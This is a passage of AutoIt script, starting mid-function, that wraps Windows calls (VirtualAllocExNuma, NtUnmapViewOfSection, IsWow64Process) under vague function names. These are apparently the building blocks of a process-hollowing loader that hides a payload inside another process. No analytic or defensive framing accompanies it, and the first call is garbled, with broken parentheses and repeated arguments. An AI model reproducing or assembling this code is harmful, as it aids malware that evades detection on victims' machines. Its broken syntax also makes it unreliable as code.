    Local $callExtDll = DllCall(DllOpen("kernel32.dll"), "ptr", "VirtualAllocExNuma","handle", $struct_process,"ptr", 0,"dword_ptr", $Size,"dword",1), 0x3000,"dword",1), 4, "dword",1), 0)
    If @error Or Not $callExtDll[0] Then Return SetError(1, 0, 0) 
        Return $callExtDll[0]
EndFunc   

Func GetMappedSection($struct_process, $BaseAddressArg)
    Local $callExtDll = DllCall(DllOpen("ntdll.dll"), "int", "NtUnmapViewOfSection","ptr", $struct_process,"ptr", $BaseAddressArg)
    If @error Then Return SetError(1, 0, $callExtDll[0]) 
    Return 1
EndFunc   

Func GetRef($struct_process)
    Local $callExtDll = DllCall("kernel32.dll", "bool", "IsWow64Process","handle", $struct_process,"bool*", 0)
    If @error Or Not $callExtDll[0] Then Return SetError(1, 0, 0) 
        Return $callExtDll[2]
EndFunc
